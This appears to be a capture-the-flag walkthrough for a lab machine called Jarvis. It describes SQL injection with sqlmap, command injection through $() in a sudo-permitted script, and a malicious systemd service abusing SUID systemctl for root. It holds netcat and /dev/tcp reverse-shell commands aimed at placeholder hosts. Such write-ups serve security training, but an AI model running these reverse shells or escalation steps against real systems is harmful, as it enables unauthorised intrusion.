jarvis
---

## Steps

1. sqli to get shell and reverse connect

We find the page `/room.php?cod=1` is vulnerable to sqli

We run sqlmap on it to get a shell, and reverse connect back to our machine

2. sudo -l, and pepper shell

we get a shell as `www-data`

running sudo -l, we see that we can run `/var/www/Admin-Utilities/simpler.py` as pepper

looking at the source code, ping runs exec, and while the tried to filter out commands, they forgot `$()`

```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> $(whoami)

pepper

```

to write a revserse shell connection, we need to write the nc commands to a file first, since the program filters out special characters

we then run it with `simpler.py`

```
echo "nc <IP> <port> -e /bin/sh" > /var/www/html/shell.sh

sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> $(sh /var/www/html/shell.sh)

```

You should now have a pepper shell, and can get the user flag

## Root Flag

1. SUID `/bin/systemctl`

Checking what binaries pepper can run

```
find / -group pepper 2>/dev/null | grep -v proc

...
/bin/systemctl
...
```

we can create a malicious service that reverse connects back to our machine. because the SUID bit is set, it will be a root shell

```
/dev/shm/root.service
---
[Unit]
Description=pwned

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

[Install]
WantedBy=multi-user.target
---


systemctl enable /dev/shm/root.service
systemctl start root.service
```

with the root shell you can get the root flag
